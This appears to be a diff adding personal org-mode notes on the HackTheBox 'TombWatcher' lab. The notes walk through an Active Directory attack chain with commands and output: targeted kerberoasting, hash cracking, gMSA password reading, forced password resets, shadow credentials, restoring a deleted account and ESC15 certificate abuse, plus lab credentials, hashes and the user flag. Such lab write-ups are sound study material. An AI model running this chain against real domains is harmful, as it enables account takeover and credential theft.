@@ -1,0 +1,632 @@
+=
+tags: #windows #active-directory #ad
+
+==
+
+* scenario
+  As is common in real life Windows pentests, you will start the TombWatcher box with
+  credentials for the following account:
+  #+begin_src 
+  henry / H3nry_987TGV!
+  #+end_src
+** ip
+   #+begin_src 
+   10.10.11.72
+   #+end_src
+   NOTE: [[file:d:/code/htb/academy/modules/intro-to-active-directory/active-directory-terminology.org::*Tombstone][this]] is what a tombstone is
+   #+begin_src 
+   A tombstone is a container object in AD that holds deleted AD objects...
+   #+end_src
+* nmap
+  #+begin_src bat
+  $ sudo nmap -sV -sC -oA nmap/tombwatcher.basic 10.10.11.72
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 00:30:39Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Not valid before: 2024-11-16T00:47:59
+|_Not valid after:  2025-11-16T00:47:59
+|_ssl-date: 2025-12-23T00:32:01+00:00; +6d09h27m13s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-12-23T00:32:00+00:00; +6d09h27m14s from scanner time.
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Not valid before: 2024-11-16T00:47:59
+|_Not valid after:  2025-11-16T00:47:59
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Not valid before: 2024-11-16T00:47:59
+|_Not valid after:  2025-11-16T00:47:59
+|_ssl-date: 2025-12-23T00:32:01+00:00; +6d09h27m13s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-12-23T00:32:00+00:00; +6d09h27m14s from scanner time.
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Not valid before: 2024-11-16T00:47:59
+|_Not valid after:  2025-11-16T00:47:59
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found                                    
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+  #+end_src
+** full scan
+   #+begin_src 
+   $ sudo nmap  -p- -A -T4 -oA nmap/tombwatcher.full 10.10.11.72
+   #+end_src
+   doesn't look different in any significant manner. we can come back to this later.
+* enumerate shares
+  #+begin_src bat
+  $ netexec smb  10.10.11.72 -u henry -p H3nry_987TGV! --shares
+DC01      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
+DC01      [+] tombwatcher.htb\henry:H3nry_987TGV! 
+DC01      [*] Enumerated shares
+DC01      Share           Permissions     Remark
+DC01      -----           -----------     ------
+DC01      ADMIN$                          Remote Admin
+DC01      C$                              Default share
+DC01      IPC$            READ            Remote IPC
+DC01      NETLOGON        READ            Logon server share 
+DC01      SYSVOL          READ            Logon server share 
+  #+end_src
+* enumerate users
+  #+begin_src bat
+  $ netexec smb  10.10.11.72 -u henry -p H3nry_987TGV! --users
+DC01      -Username-        -Last PW Set-       -BadPW- -Description-
+DC01      Administrator     2025-04-25 14:56:03 0       Built-in account
+DC01      Guest             <never>             0       Built-in account
+DC01      krbtgt            2024-11-16 00:02:28 0       Key Distribution Center Service Account 
+DC01      Henry             2025-05-12 15:17:03 0        
+DC01      Alfred            2025-05-12 15:17:03 0        
+DC01      sam               2025-05-12 15:17:03 0        
+DC01      john              2025-05-19 13:25:10 0 
+  #+end_src
+* kerberoastable accounts
+  #+begin_src bat
+  netexec ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --kerberoasting kerberoasting.out
+  #+end_src
+  returns nothing; is it not working or just not returning anything?
+  crackmapexec runs into some error.
+* asreproastable accounts
+  #+begin_src 
+  netexec ldap dc01.tombwatcher.htb -u users.list -p '' --asreproast asreproast.out
+  #+end_src
+  comes up with nothing.
+* port 80
+  visiting =tombwatcher.htb= shows a default IIS page(?)
+** tilde enumeration
+   #+begin_src 
+   $ shortscan http://tombwatcher.htb
+   #+end_src
+   returns 2 generic looking links both of which are forbidden
+* bloodhound
+  #+begin_src bat
+  bloodhound-python -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' -dc 'dc01.tombwatcher.htb' -c all -ns 10.10.11.72
+  #+end_src
+  this generates a bunch of json files which can be zipped with:
+  #+begin_src bat
+  zip -r tombwatcher.zip *.json
+  #+end_src
+  start bloodhound with the command =sudo bloodhound=;
+  we see that the user =henry= has =WriteSPN= permission over the user =alfred=
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-23_11-08.png @ 2025-12-23 11:10:05
+  [[file:bloodhound/2025-12-23_11-10-05_2025-12-23_11-08.png]]
+
+  according to [[https://bloodhound.specterops.io/resources/edges/write-spn][this]], this permission can be used to perform a targeted kerberoasting attack
+  #+begin_src bat
+  $ impacket-GetUserSPNs -dc-ip 10.10.11.72 TOMBWATCHER.HTB/henry -request-user alfred 
+
+No entries found!
+  #+end_src
+  running for all users results in the same output; 
+** the probable attack path
+   however, this still does look like the attack path - =alfred= has =AddSelf= control over the
+   =INFRASTRUCTURE= group which has the =ReadGMSAPassword= right over the =ANSIBLE_DEV= group which
+   has =ForceChangePassword= right over the user =Sam= who has =WriteOwner= right on the user =John=
+   who has =GenericAll= right over the =ADCS= OU
+   we need to gain a foothold for any of this though.
+* psexec
+  #+begin_src bat
+  $ impacket-psexec TOMBWATCHER.HTB/henry:'H3nry_987TGV!'@10.10.11.72
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.11.72.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+  #+end_src
+* dns
+  #+begin_src 
+  dig AXFR @10.10.11.72 tombwatcher.htb
+  #+end_src
+* shares
+** SYSVOL
+   we know SYSVOL sometimes contains passwords and scripts; let's check:
+*** spider
+    #+begin_src 
+     netexec smb  10.10.11.72 -u henry -p H3nry_987TGV! -M spider_plus --share 'SYSVOL'
+    #+end_src
+    doesn't contain anything interesting; but let's check just in case:
+    #+begin_src bat
+     smbclient -U henry //10.10.11.72/SYSVOL
+    #+end_src
+** NETLOGON
+*** spider
+    #+begin_src 
+     netexec smb  10.10.11.72 -u henry -p H3nry_987TGV! -M spider_plus --share 'NETLOGON'
+    #+end_src
+    doesn't contain anything.
+* http server on 5985
+  #+begin_src 
+  http://10.10.11.72:5985 or http://tombwatcher.htb:5985
+  #+end_src
+  returns a not found page
+  #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2025-12-25_11-09.png @ 2025-12-25 11:10:10
+  [[file:http_server_on_5985/2025-12-25_11-10-10_2025-12-25_11-09.png]]
+** directory enumeration with gobuster
+   #+begin_src bat
+   gobuster dir -u http://10.10.11.72:5985/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
+   #+end_src
+** virtual hosts enumeration
+   #+begin_src bat
+   gobuster vhost -u http://tombwatcher.htb:5985 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
+   #+end_src
+   returns nothing.
+   NOTE: turns out this is WinRM over HTTP
+* ldap
+  got chatgpt to give me a way to look for tombstone objects:
+  #+begin_src bat
+  $ ldapsearch -x -H ldap://DC01.tombwatcher.htb -D "TOMBWATCHER\\henry" -w 'H3nry_987TGV!' -b "DC=tombwatcher,DC=htb" -E 1.2.840.113556.1.4.417 "(isDeleted=TRUE)"
+# extended LDIF
+#
+# LDAPv3
+# base <DC=tombwatcher,DC=htb> with scope subtree
+# filter: (isDeleted=TRUE)
+# requesting: ALL
+
+# search reference
+ref: ldap://ForestDnsZones.tombwatcher.htb/DC=ForestDnsZones,DC=tombwatcher,DC=htb
+# search reference
+ref: ldap://DomainDnsZones.tombwatcher.htb/DC=DomainDnsZones,DC=tombwatcher,DC=htb
+
+# search reference
+ref: ldap://tombwatcher.htb/CN=Configuration,DC=tombwatcher,DC=htb
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 4
+# numReferences: 3
+  #+end_src
+  nothing was returned, in effect.
+* WinRM
+  let's try winrm on port 5985
+  #+begin_src 
+  evil-winrm -i 10.10.11.72 -u henry -p H3nry_987TGV!
+
+Error: An error of type WinRM::WinRMAuthorizationError happened...
+  #+end_src
+  meaning henry does not have remote management access.
+* WriteSPN
+  ok so you don't actually need interactive access or PowerView to make use of this:
+  (chatgpt) =WriteSPN= enables a forced Kerberoast:
+  1. You add a fake SPN to Alfred
+  2. You request a TGS for that SPN
+  3. Kerberos returns a ticket encrypted with Alfred's NT hash
+  4. You crack it offline
+  5. Alfred's credentials -> shell / escalation
+  we can use BloodyAD for the first bit:
+** bloodyAD  
+  #+begin_src 
+  $ bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v HTTP/fake.tombwatcher.htb
+
+[+] alfred's servicePrincipalName has been updated 
+  #+end_src
+** request a TGS
+   #+begin_src 
+   $ impacket-GetUserSPNs -dc-ip 10.10.11.72 TOMBWATCHER.HTB/henry:H3nry_987TGV! -request
+   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName       Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
+-------------------------  ------  --------  --------------------------  ---------  ----------
+HTTP/fake.tombwatcher.htb  Alfred            2025-05-12 17:17:03.526670  <never>
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+   #+end_src
+** fix clock skew
+   #+begin_src bat
+   $ sudo ntpdate dc01.tombwatcher.htb
+
+2025-12-26 15:13:45.046287 (+0100) +14401.335478 +/- 0.032106 dc01.tombwatcher.htb 10.10.11.72 s1 no-leap
+CLOCK: time stepped by 14401.335478
+   #+end_src
+** request TGS again
+   #+begin_src bat
+   $ impacket-GetUserSPNs -dc-ip 10.10.11.72 TOMBWATCHER.HTB/henry:H3nry_987TGV! -request
+
+ServicePrincipalName       Name    MemberOf  PasswordLastSet             LastLogon  Delegation 
+-------------------------  ------  --------  --------------------------  ---------  ----------
+HTTP/fake.tombwatcher.htb  Alfred            2025-05-12 17:17:03.526670  <never>
+
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$TOMBWATCHER.HTB/Alfred*$72b21d2b288f5ca9192ff0f39a8b...
+   #+end_src
+** crack with hashcat
+   #+begin_src bat
+   hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
+   #+end_src
+   comes back with =basketball=
+** alfred creds
+   #+begin_src 
+   alfred: basketball
+   #+end_src
+* AddSelf
+  let's add alfred to the *INFRASTRUCTURE* group
+  #+begin_src bat
+  bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p 'basketball' add groupMember "Infrastructure" alfred
+
+[+] alfred added to Infrastructure 
+  #+end_src
+** check it worked
+   #+begin_src bat
+   bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p 'basketball' get object "Infrastructure"
+
+   ...
+member: CN=Alfred,CN=Users,DC=tombwatcher,DC=htb
+   ...
+   #+end_src
+* ReadGMSAPassword
+  #+begin_src 
+  bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p 'basketball' get object ansible_dev$ --attr msDS-ManagedPassword
+  #+end_src
+  the above is the command i found [[https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword][here]]; however, bloodyAD doesn't seem to recognize an
+  =--attr= switch; once that's removed we do get data but it still doesn't contain the
+  =msDS-ManagedPassword=; instead, it contains an Id:
+  #+begin_src
+  distinguishedName: CN=ansible_dev,CN=Managed Service Accounts,DC=tombwatcher,DC=htb
+  accountExpires: 9999-12-31 23:59:59.999999+00:00
+  badPasswordTime: 1601-01-01 00:00:00+00:00
+  badPwdCount: 0
+  cn: ansible_dev
+  codePage: 0
+  countryCode: 0
+  dNSHostName: TOMBWATCHER.HTB
+  dSCorePropagationData: 1601-01-01 00:00:00+00:00
+  instanceType: 4
+  isCriticalSystemObject: False
+  lastLogoff: 1601-01-01 00:00:00+00:00
+  lastLogon: 1601-01-01 00:00:00+00:00
+  localPolicyFlags: 0
+  logonCount: 0
+  msDS-GroupMSAMembership: O:S-1-5-32-544D:(A;;0xf01ff;;;S-1-5-21-1392491010-1358638721-2126982587-1107)
+  msDS-ManagedPasswordId: AQAAAEtEU0sCAAAAagEAABsAAAAIAAAAc6NtcnDRepr24Tfly34IywAAAAAgAAA...
+  <SNIP>
+  #+end_src
+** try gMSADumper.py
+   cloned this repo to /usr/share; run:
+   #+begin_src bat
+   python gMSADumper.py -u alfred -p 'basketball' -d tombwatcher.htb  -l DC01.tombwatcher.htb
+
+Users or groups who can read password for ansible_dev$: 
+  > Infrastructure
+   #+end_src
+   after a bit of debugging, it's apparent the data structure it's walking through does not
+   contain the elements:
+   #+begin_src python
+   if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
+   #+end_src
+   IMPORTANT: ok so it turned out the issue here was we needed to perform this immediately
+   after *Alfred* was added to the *Infrastructure* group, as there is a cleanup script which runs.
+   checking alfred's memberships, we can see the *membercount* for the *Infrastructure* group is 0
+   #+begin_src bat
+   $ nxc ldap DC01.tombwatcher.htb -u 'alfred' -p 'basketball' --groups
+....
+LDAP   10.10.11.72     389    DC01      Infrastructure      membercount: 0
+   #+end_src
+   rerunning the script, we get:
+   #+begin_src bat
+$ python ./gMSADumper.py -u alfred -p 'basketball' -d tombwatcher.htb  -l DC01.tombwatcher.htb
+
+Users or groups who can read password for ansible_dev$:
+ > Infrastructure
+
+ansible_dev$:::2669c6ff3a3d9c7472e358c7a792697b
+ansible_dev$:aes256-cts-hmac-sha1-96:3cdbffeefea8bb3e2619566eb888fdb1dd5bcf1c7b8b0962be11fb39750b135d
+ansible_dev$:aes128-cts-hmac-sha1-96:79a0b60efc9089900b73384d954778f0
+   #+end_src
+** using nxc
+  #+begin_src 
+  $ nxc ldap 10.10.11.72 -u 'alfred' -p 'basketball' --gmsa --port 636
+  LDAPS   10.10.11.72  636    DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
+  LDAPS   10.10.11.72  636    DC01  [+] tombwatcher.htb\alfred:basketball 
+  LDAPS   10.10.11.72  636    DC01  [*] Getting GMSA Passwords
+  LDAPS   10.10.11.72  636    DC01  Account: ansible_dev$     NTLM: 2669c6ff3a3d9c7472e358c7a792697b     PrincipalsAllowedToReadPassword: Infrastructure
+  #+end_src
+** NTLM hash
+  #+begin_src 
+  2669c6ff3a3d9c7472e358c7a792697b
+  #+end_src
+* Force change Sam's password
+  #+begin_src bat
+  bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u ansible_dev$ -p:2669c6ff3a3d9c7472e358c7a792697b set password Sam 'NewStrongP@ssw0rd!'
+
+[+] Password changed successfully!
+  #+end_src
+** sanity check
+   #+begin_src bat
+   $ nxc smb DC01.tombwatcher.htb -u Sam -p 'NewStrongP@ssw0rd!'
+
+SMB  10.10.11.72  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
+SMB  10.10.11.72  445  DC01  [+] tombwatcher.htb\Sam:NewStrongP@ssw0rd! 
+   #+end_src
+** other options - rpcclient
+   #+begin_src bat
+   rpcclient -U "TOMBWATCHER\\ansible_dev$%<NTLM_HASH_HERE>" DC01.tombwatcher.htb -c "setuserinfo2 Sam 23 'NewStrongP@ssw0rd!'"
+   #+end_src
+   havent' confirmed this though
+* Abuse WriteOwner to take ownership of john
+  #+begin_src bat
+  bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u Sam -p 'NewStrongP@ssw0rd!' set owner John Sam
+
+[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by Sam on John
+  #+end_src
+  John is a member of =Remote Management Users= so here we should get the User flag
+* grant full ownership of John to Sam
+  #+begin_src 
+  $ bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u Sam -p 'NewStrongP@ssw0rd!' add genericAll John Sam
+
+[+] Sam has now GenericAll on John
+  #+end_src
+* reset John's password
+  #+begin_src bat
+  $ bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u Sam -p 'NewStrongP@ssw0rd!' set password John 'JohnNewP@ss!'
+                                   
+[+] Password changed successfully!
+  #+end_src
+* user flag
+  #+begin_src 
+  evil-winrm -i 10.10.11.72 -u john -p 'JohnNewP@ss!'
+
+ ,*Evil-WinRM* PS C:\Users\john\Desktop> cat user.txt
+ 
+95488dc6dbac9c8ea1fd7324a19f4821
+  #+end_src
+* upload powerview
+  download it first (probably already exists elsewhere, but anyway)
+  #+begin_src 
+  $ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
+  #+end_src
+  inside the evil-winrm shell
+  #+begin_src 
+  ,*Evil-WinRM* PS C:\Users\john\Documents> upload PowerView.ps1 PowerView.ps1  
+  #+end_src
+** import
+   #+begin_src 
+   ,*Evil-WinRM* PS C:\Users\john\Documents> Import-Module .\PowerView.ps1
+   #+end_src
+   not really sure where we can go with this. maybe try rusthound as john and see if anything
+   additional pops up.
+* rusthound-ce
+  #+begin_src 
+  rusthound-ce -u john -p 'JohnNewP@ss!' -d 'tombwatcher.htb' -c All
+  #+end_src
+  this reveals more info but not sure if it's more useful. what can we do with the =GenericAll=
+  over *ADCS*?
+* check for dcsync privs
+  #+begin_src bat
+  ,*Evil-WinRM* PS C:\Users\john\Documents> Get-DomainUser -Identity john |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+
+samaccountname     : john
+objectsid          : S-1-5-21-1392491010-1358638721-2126982587-1106
+memberof           : CN=Remote Management Users,CN=Builtin,DC=tombwatcher,DC=htb
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+  #+end_src
+  now let's check for replication rights
+  #+begin_src bat
+  PS C:\htb> $sid= "S-1-5-21-1392491010-1358638721-2126982587-1106"
+  PS C:\htb> Get-ObjectAcl "DC=tombwatcher,DC=htb" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+  #+end_src
+  returns nothing.
+* noPac
+** scan
+  #+begin_src 
+  sudo python3 scanner.py tombwatcher.htb/john:JohnNewP@ss! -dc-ip 10.10.11.72 -use-ldap
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 10.10.11.72. Ticket size 1563
+[*] Got TGT from 10.10.11.72. Ticket size 1563
+  #+end_src
+** run
+   sudo python3 noPac.py tombwatcher.htb/john:JohnNewP@ss! -dc-ip 10.10.11.72 -dc-host tombwatcher.htb -shell --impersonate administrator -use-ldap
+   #+begin_src bat
+   $ sudo python3 noPac.py tombwatcher.htb/john:JohnNewP@ss! -dc-ip 10.10.11.72 -dc-host DC01 --impersonate administrator -use-ldap -dump
+
+   [*] Current ms-DS-MachineAccountQuota = 10
+   [*] Selected Target DC01.tombwatcher.htb
+   [*] will try to impersonate administrator
+   [*] Adding Computer Account "WIN-UWCF1JREHHZ$"
+   [*] MachineAccount "WIN-UWCF1JREHHZ$" password = Xvz0CUH$ounw
+   [*] Successfully added machine account WIN-UWCF1JREHHZ$ with password Xvz0CUH$ounw.
+   [*] WIN-UWCF1JREHHZ$ object = CN=WIN-UWCF1JREHHZ,CN=Computers,DC=tombwatcher,DC=htb
+   [-] Cannot rename the machine account , Reason 00000523: SysErr: DSID-031A1242, problem 22 (Invalid argument), data 0
+
+   [*] Attempting to del a computer with the name: WIN-UWCF1JREHHZ$
+   [-] Delete computer WIN-UWCF1JREHHZ$ Failed! Maybe the current user does not have permission.
+   #+end_src
+   this doesn't looks like the path.
+* ippsec
+** kerberoasting with nxc
+   #+begin_src 
+   nxc ldap dc01.tombwatcher.htb -u henry -p 'H3nry_987TGV!' --kerberoasting -
+   #+end_src
+** unset the SPN added to alfred
+     #+begin_src bat
+     $ bloodyAD --host DC01.tombwatcher.htb -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName 
+     #+end_src
+** nxc to read gmsa password
+   #+begin_src 
+   nxc ldap dc01.tombwatcher.htb -u alfred -p basketball --gmsa
+   #+end_src
+** use certipy to add shadow creds instead of changing John's password
+   "we could just change the password, but I hate changing the password if we have another
+   route to do something."
+   #+begin_src bat
+   certipy-ad shadow auto -u sam@tombwatcher.htb -p 'NewStrongP@ssw0rd!' -account john -dc-ip 10.10.11.72
+
+[*] NT hash for 'john': 08c7fbb0121095c2ba13f4297b7ca355
+   #+end_src
+** cypher query to find the tombstone object
+   when we run the saved cypher query =Enrollment rights on published certificate templates=, we
+   come across a nameless object with an SID (this means it's a tombstone object) which has
+   =Enrollment= rights over the =WEBSERVER= certificate template:
+   #+DOWNLOADED: file:C%3A/Users/shyam/Desktop/2026-01-02_15-32.png @ 2026-01-02 15:33:18
+   [[file:ippsec/2026-01-02_15-33-18_2026-01-02_15-32.png]]
+   
+   NOTE: also, the certificate details are only available if you run =rusthound=
+** certipy
+   we can also pick up the above info from running certipy
+   #+begin_src bat
+   certipy-ad find -u john -hashes :08c7fbb0121095c2ba13f4297b7ca355 -target 10.10.11.72
+   #+end_src
+   going through the output we can see this block under the =WebServer= template:
+   #+begin_src js
+       "Enrollment Permissions": {
+	  "Enrollment Rights": [
+            "TOMBWATCHER.HTB\\Domain Admins",
+            "TOMBWATCHER.HTB\\Enterprise Admins",
+            "S-1-5-21-1392491010-1358638721-2126982587-1111"
+          ]
+        },
+   #+end_src
+** investigate the SID via the winrm shell
+   #+begin_src bat
+   Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties *
+   #+end_src
+   this gives us nothing; however, we should add the =-IncludeDeletedObjects= option, we get:
+   #+begin_src bat
+   Get-ADObject -Filter 'objectsid -eq "S-1-5-21-1392491010-1358638721-2126982587-1111"' -Properties * -IncludeDeletedObjects
+
+accountExpires                  : 9223372036854775807                                                                 
+badPasswordTime                 : 0                                                                                   
+badPwdCount                     : 0                                                                                   
+CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+CN                              : cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf  
+codePage                        : 0                                                                                   
+countryCode                     : 0         
+Created                         : 11/16/2024 12:07:04 PM                                                              
+createTimeStamp                 : 11/16/2024 12:07:04 PM
+Deleted                         : True
+Description                     :                       
+DisplayName                     :                       
+DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
+givenName                       : cert_admin
+instanceType                    : 4                                                                                   
+isDeleted                       : True
+LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb                                          
+lastLogoff                      : 0         
+lastLogon                       : 0
+logonCount                      : 0   
+Modified                        : 11/16/2024 12:07:27 PM                                                              
+modifyTimeStamp                 : 11/16/2024 12:07:27 PM
+msDS-LastKnownRDN               : cert_admin
+Name                            : cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :           
+ObjectClass                     : user      
+ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf    
+objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111  
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133762504248946345                                                                  
+sAMAccountName                  : cert_admin                                                                          
+sDRightsEffective               : 7  
+sn                              : cert_admin
+userAccountControl              : 66048             
+uSNChanged                      : 13197     
+uSNCreated                      : 13186
+whenChanged                     : 11/16/2024 12:07:27 PM
+whenCreated                     : 11/16/2024 12:07:04 PM
+   #+end_src
+** restore the deleted object
+   #+begin_src 
+   Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+   #+end_src
+   NOTE: the =-Identity= value is the =ObjectGUID=
+   this returns no output so confirm with the earlier command minus the =IncludeDeletedObjects=
+** back to certipy - add shadow creds
+   #+begin_src bat
+   certipy-ad shadow auto -u john@tombwatcher.htb -hashes :08c7fbb0121095c2ba13f4297b7ca355 -account cert_admin -dc-ip 10.10.11.72
+
+[*] Targeting user 'cert_admin'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '1f4f3a7c29e64470a1f1126132942ae8'
+[*] Adding Key Credential with device ID '1f4f3a7c29e64470a1f1126132942ae8' to the Key Credentials for 'cert_admin'
+[*] Successfully added Key Credential with device ID '1f4f3a7c29e64470a1f1126132942ae8' to the Key Credentials for 'cert_admin'
+[*] Authenticating as 'cert_admin' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'cert_admin@tombwatcher.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'cert_admin.ccache'
+[*] Wrote credential cache to 'cert_admin.ccache'
+[*] Trying to retrieve NT hash for 'cert_admin'
+[*] Restoring the old Key Credentials for 'cert_admin'
+[*] Successfully restored the old Key Credentials for 'cert_admin'
+[*] NT hash for 'cert_admin': f87ebf0febd9c4095c68a88928755773
+   #+end_src
+** find vulnerable templates
+   #+begin_src bat
+   certipy-ad find -u cert_admin -hashes :f87ebf0febd9c4095c68a88928755773 -target 10.10.11.72 -vulnerable
+   #+end_src
+   in the output, we find this block:
+   #+begin_src js
+   "[!] Vulnerabilities": {
+        "ESC15": "Enrollee supplies subject and schema version is 1."
+      }
+   "[*] Remarks": {
+        "ESC15": "Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details."
+      }
+   #+end_src
+** exploit ESC15
+   #+begin_src bat
+   $ certipy-ad req -u cert_admin -hashes :f87ebf0febd9c4095c68a88928755773 -target 10.10.11.72 -ca tombwatcher-CA-1 -template WebServer -application-policies 'Certificate Request Agent'
+
+[*] Requesting certificate via RPC
+[*] Request ID is 5
+[*] Successfully requested certificate
+[*] Got certificate without identity
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'cert_admin.pfx'
+[*] Wrote certificate and private key to 'cert_admin.pfx'
+   #+end_src
+** request certificates as cert_admin user
+* learnings
+  - the major one here of course is that it's not necessary to look for an interactive way to
+    own these AD machines, and that PowerView is not the only way to do things.
+  - with AD stuff, make sure to do sanity checks whenever you make a change.
